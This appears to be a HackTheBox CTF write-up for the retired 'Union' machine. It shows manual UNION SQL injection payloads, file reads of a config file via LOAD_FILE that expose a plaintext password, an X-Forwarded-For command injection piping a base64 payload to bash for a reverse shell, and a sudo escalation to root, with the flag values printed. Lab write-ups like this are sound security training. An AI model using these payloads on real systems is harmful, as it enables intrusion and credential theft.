# HackTheBox — Union

| Field | Details |
| --- | --- |
| Platform | HackTheBox |
| Challenge | Union |
| Difficulty | Medium |
| OS | Linux (Ubuntu) |
| IP | 10.129.96.75 |
| Date | October 2026 |
| User Flag | `0254e4e7f57d98a5c4c2ba6d71725d44` |
| Root Flag | `241229c31f18818f2e81556fc5e42724` |

---

## Challenge Summary

Union is a Medium web challenge centered on manual UNION-based SQL injection. The only initially exposed service is HTTP, while SSH is gated by a firewall rule that is removed only after the challenge flag is submitted. The player eligibility form has a response-differential SQL injection in its `player` parameter. Manual column enumeration, `INFORMATION_SCHEMA`, and `GROUP_CONCAT()` reveal the challenge flag and the MySQL service context.

The database account holds MySQL's `FILE` privilege. `LOAD_FILE()` extracts `config.php`, revealing credentials reused by the `uhc` Linux account. Once SSH access is unlocked, the application source exposes an unsanitized `X-Forwarded-For` header in a privileged firewall command. Command injection yields a `www-data` shell with unrestricted passwordless sudo.

---

## Attack Chain Summary

```
Nmap → HTTP only; SSH is firewalled
Player eligibility form → manual UNION SQLi
INFORMATION_SCHEMA → november.flag(one)
Extract UHC{F1rst_5tep_2_Qualify} → submit to /challenge.php
Server whitelists attacker IP → SSH opens
LOAD_FILE('/var/www/html/config.php') → uhc password
SSH as uhc → user flag
Review firewall.php → X-Forwarded-For command injection
Reverse shell as www-data → NOPASSWD sudo su - → root flag
```

---

## Step 1 — Reconnaissance

```bash
Hackerpatel007_1@htb[/htb]$ ports=$(sudo nmap -p- --min-rate=1000 -T4 10.129.96.75 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
Hackerpatel007_1@htb[/htb]$ sudo nmap -p$ports -sV -sC 10.129.96.75
```

```
80/tcp open  http  nginx 1.18.0 (Ubuntu)
```

Only port 80 accessible — SSH is firewall-gated.

---

## Step 2 — Confirm SQL Injection Through Response Differential

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d 'player=celesian' http://10.129.96.75/index.php
Sorry, celesian you are not eligible due to already qualifying.

Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=celesian'" http://10.129.96.75/index.php
Congratulations celesian' you may compete in this tournament!

Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=celesian'-- -" http://10.129.96.75/index.php
Sorry, celesian you are not eligible due to already qualifying.
```

SQL injection confirmed via response differential.

---

## Step 3 — Manual UNION SQLi and Challenge Flag

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select 1-- -" http://10.129.96.75/index.php
Sorry, 1 you are not eligible...
# One reflected column confirmed

Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select group_concat(TABLE_NAME,':',COLUMN_NAME,'\n') from INFORMATION_SCHEMA.columns where TABLE_SCHEMA='november'-- -" http://10.129.96.75/index.php
# → flag:one, players:player

Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select group_concat(one) from november.flag-- -" http://10.129.96.75/index.php
Sorry, UHC{F1rst_5tep_2_Qualify} you are not eligible...
```

**Challenge flag:** `UHC{F1rst_5tep_2_Qualify}`

---

## Step 4 — Unlock SSH and Extract Credentials

Submit flag at `/challenge.php` → attacker IP granted SSH access.

```bash
Hackerpatel007_1@htb[/htb]$ curl -X POST -d "player=noresult' union select LOAD_FILE('/var/www/html/config.php')-- -" http://10.129.96.75/index.php
```

```php
$username = "uhc";
$password = "uhc-11qual-global-pw";
```

---

## Step 5 — SSH as uhc

```bash
Hackerpatel007_1@htb[/htb]$ ssh uhc@10.129.96.75
uhc@union:~$ cat user.txt
0254e4e7f57d98a5c4c2ba6d71725d44
```

---

## Step 6 — Source Review and Header Command Injection

```bash
uhc@union:~$ cat /var/www/html/firewall.php
```

```php
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
```

Start listener:

```bash
Hackerpatel007_1@htb[/htb]$ nc -lvnp 9001
Hackerpatel007_1@htb[/htb]$ curl -s -b 'PHPSESSID=<session>' \
  -H 'X-Forwarded-For: 8.8.8.8; echo <base64_payload> | base64 -d | bash;' \
  http://10.129.96.75/firewall.php
```

```
www-data@union:/var/www/html$
```

---

## Step 7 — Root via www-data Sudo

```bash
www-data@union:/var/www/html$ sudo -l
(ALL : ALL) NOPASSWD: ALL

www-data@union:/var/www/html$ sudo su -
root@union:~# cat /root/root.txt
241229c31f18818f2e81556fc5e42724
```

| Flag | Value |
| --- | --- |
| User | `0254e4e7f57d98a5c4c2ba6d71725d44` |
| Root | `241229c31f18818f2e81556fc5e42724` |

---

## Lessons Learned

- Use a known database value when comparing responses — errors and no-result can share an output branch.
- Manual UNION SQLi: column count, reflection, `INFORMATION_SCHEMA`, `GROUP_CONCAT()` are enough when automation fails.
- MySQL `FILE` turns SQLi into a server file-read primitive.
- `X-Forwarded-For` is never a trusted identity source for shell commands.
- `(ALL : ALL) NOPASSWD: ALL` on a web-service account converts any web shell into immediate root.

---

## Commands Reference

| Command | Purpose |
| --- | --- |
| `nmap -p- --min-rate=1000 -T4 <IP>` | Full TCP port discovery |
| `curl -X POST -d "player=noresult' union select 1-- -" <URL>` | Confirm one-column UNION SQLi |
| `curl -X POST -d "player=noresult' union select group_concat(one) from november.flag-- -"` | Extract challenge flag |
| `curl -X POST -d "player=noresult' union select LOAD_FILE('/var/www/html/config.php')-- -"` | Read config credentials |
| `ssh uhc@<IP>` | SSH after firewall unlock |
| `curl -H 'X-Forwarded-For: 8.8.8.8; echo <b64> | base64 -d | bash;'` | Header command injection |
| `sudo su -` | Root from www-data NOPASSWD sudo |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Detail |
| --- | --- | --- |
| Reconnaissance | T1595.001 | TCP port enumeration |
| Initial Access | T1190 | Manual UNION SQL injection |
| Credential Access | T1552.001 | `config.php` via MySQL `LOAD_FILE()` |
| Lateral Movement | T1021.004 | SSH as `uhc` after firewall grant |
| Execution | T1059.004 | Command injection via `X-Forwarded-For` |
| Privilege Escalation | T1548.003 | `www-data` unrestricted passwordless sudo |

*HackTheBox retired machine — writeup published after official retirement.*
*Penetration Tester role in India | Target: January 2027*
